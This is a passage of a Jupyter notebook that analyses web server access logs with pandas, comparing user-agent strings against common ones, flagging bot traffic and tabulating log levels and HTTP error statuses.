     "output_type": "execute_result"
    }
   ],
   "source": [
    "[print(a) for a in common_useragents[common_useragents[\"user-agent\"].apply(lambda x: \"Mac OS X\" in str(x)).fillna(False)][\"user-agent\"]]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "10_15_7    33395\n",
       "10          2315\n",
       "10_10_1     2044\n",
       "10_15_6     1701\n",
       "10_15_5     1517\n",
       "           ...  \n",
       "10_12_1        1\n",
       "9_0_2          1\n",
       "9_1            1\n",
       "9_2_2          1\n",
       "9_2            1\n",
       "Name: count, Length: 65, dtype: int64"
      ]
     },
     "execution_count": 61,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "matches = []\n",
    "for ua in df[\"user-agent\"]:\n",
    "\ttry:\n",
    "\t\tmatch = re.search(r\"Mac OS X ([\\d_]*)\", str(ua)).group(1)\n",
    "\t\tmatches.append(match)\n",
    "\texcept AttributeError:\n",
    "\t\tpass\n",
    "matches = pd.Series(matches)\n",
    "matches.value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [],
   "source": [
    "subst_pattern = (r\"[\\d\\.]{3,}|[\\d_]{3,}\", \"<v>\")\n",
    "common_useragents_subs = common_useragents[\"user-agent\"].apply(lambda x: re.sub(subst_pattern[0], subst_pattern[1], x))\n",
    "my_useragents_subs = df[\"user-agent\"].apply(lambda x: re.sub(subst_pattern[0], subst_pattern[1], str(x)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [],
   "source": [
    "is_common = my_useragents_subs.apply(lambda x: str(x) in common_useragents_subs.values)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "31.191682143841664"
      ]
     },
     "execution_count": 73,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "is_common.sum() / len(df) * 100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "level\n",
       " 0     715315\n",
       " 5      24144\n",
       " 10      1328\n",
       "-1        435\n",
       " 6        101\n",
       " 7          5\n",
       " 3          5\n",
       " 15         3\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 77,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[~is_common][\"level\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(61.06908064188276, 88.7524685163003)"
      ]
     },
     "execution_count": 83,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "is_bot = df[~is_common][\"user-agent\"].apply(lambda x: \"bot\" in str(x).lower())\n",
    "is_bot.sum() / len(df) * 100, is_bot.sum() / len(df[~is_common]) * 100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "user-agent\n",
       "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; spider-feedback@bytedance.com)                                            34378\n",
       "Mozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)                                                                                                                           2361\n",
       "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)                                                                                                                        1280\n",
       "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36                                                                                         1275\n",
       "-                                                                                                                                                                                                1113\n",
       "                                                                                                                                                                                                ...  \n",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/270.0.542728515 Mobile/21C66 Safari/604.1                                                     1\n",
       "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14                                                                              1\n",
       "Mozilla/5.0 (Windows; U; Windows NT 6.0; de-AT; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2                                                                                                            1\n",
       "Mozilla/5.0 (Linux; Android 13; SM-A226B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GoogleApp/14.34.24.28.arm64            1\n",
       "Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.211 Mobile Safari/537.36 GoogleApp/15.1.34.28.arm64        1\n",
       "Name: count, Length: 1675, dtype: int64"
      ]
     },
     "execution_count": 84,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[~is_common][~is_bot][\"user-agent\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 88,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>absolute</th>\n",
       "      <th>relative</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>level</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>80481</td>\n",
       "      <td>7.687539</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>2332</td>\n",
       "      <td>8.725259</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>-1</th>\n",
       "      <td>435</td>\n",
       "      <td>100.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>76</td>\n",
       "      <td>71.698113</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>49</td>\n",
       "      <td>2.985984</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>5</td>\n",
       "      <td>0.318066</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>3</td>\n",
       "      <td>100.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>1</td>\n",
       "      <td>14.285714</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       absolute    relative\n",
       "level                      \n",
       " 0        80481    7.687539\n",
       " 5         2332    8.725259\n",
       "-1          435  100.000000\n",
       " 6           76   71.698113\n",
       " 10          49    2.985984\n",
       " 3            5    0.318066\n",
       " 15           3  100.000000\n",
       " 7            1   14.285714"
      ]
     },
     "execution_count": 88,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "abs_level = df[~is_common][~is_bot][\"level\"].value_counts()\n",
    "rel_level = df[~is_common][~is_bot][\"level\"].value_counts() / df[\"level\"].value_counts() * 100\n",
    "pd.concat([abs_level, rel_level], axis=1, keys=[\"absolute\", \"relative\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>absolute</th>\n",
       "      <th>relative</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>status</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>404</th>\n",
       "      <td>26523.0</td>\n",
       "      <td>89.966419</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>403</th>\n",
       "      <td>315.0</td>\n",
       "      <td>96.330275</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>400</th>\n",
       "      <td>306.0</td>\n",
       "      <td>99.029126</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>408</th>\n",
       "      <td>239.0</td>\n",
       "      <td>100.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>504</th>\n",
       "      <td>1.0</td>\n",
       "      <td>100.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>401</th>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "        absolute    relative\n",
       "status                      \n",
       "404      26523.0   89.966419\n",
       "403        315.0   96.330275\n",
       "400        306.0   99.029126\n",
       "408        239.0  100.000000\n",
       "504          1.0  100.000000\n",
       "401          0.0    0.000000"
      ]
     },
     "execution_count": 121,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "abs_status = df[~is_common][\"status\"].value_counts()\n",
    "rel_status = df[~is_common][\"status\"].value_counts() / df[\"status\"].value_counts() * 100\n",
    "concat = pd.concat([abs_status, rel_status], axis=1, keys=[\"absolute\", \"relative\"]).fillna(0)\n",
    "abs_status = df[~is_common][is_bot][\"status\"].value_counts()\n",
    "rel_status = df[~is_common][is_bot][\"status\"].value_counts() / df[\"status\"].value_counts() * 100\n",
    "concat_bot = pd.concat([abs_status, rel_status], axis=1, keys=[\"absolute\", \"relative\"]).fillna(0)\n",
    "concat[(concat.index < 200) | (concat.index >= 400)]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "90.203570722709"
      ]
     },
     "execution_count": 131,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "counts = df[\"status\"].value_counts()\n",
    "e = concat[(concat.index < 200) | (concat.index >= 400)][\"absolute\"].sum()\n",
    "e_total = counts[(counts.index < 200) | (counts.index >= 400)].sum()\n",
    "e / e_total * 100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "77.76533368469596"
      ]
     },
     "execution_count": 132,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "e_bot = concat_bot[(concat_bot.index < 200) | (concat_bot.index >= 400)][\"absolute\"].sum()\n",
    "e_bot / e_total * 100"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Level"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "counts = df[\"level\"].value_counts()\n",
    "plt.bar(counts.index, counts)\n",
    "plt.xlabel(\"Level\")\n",
    "plt.ylabel(\"number of logs\")\n",
    "plt.yscale(\"log\")\n",
    "plt.xticks(counts.index)\n",
    "plt.show()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
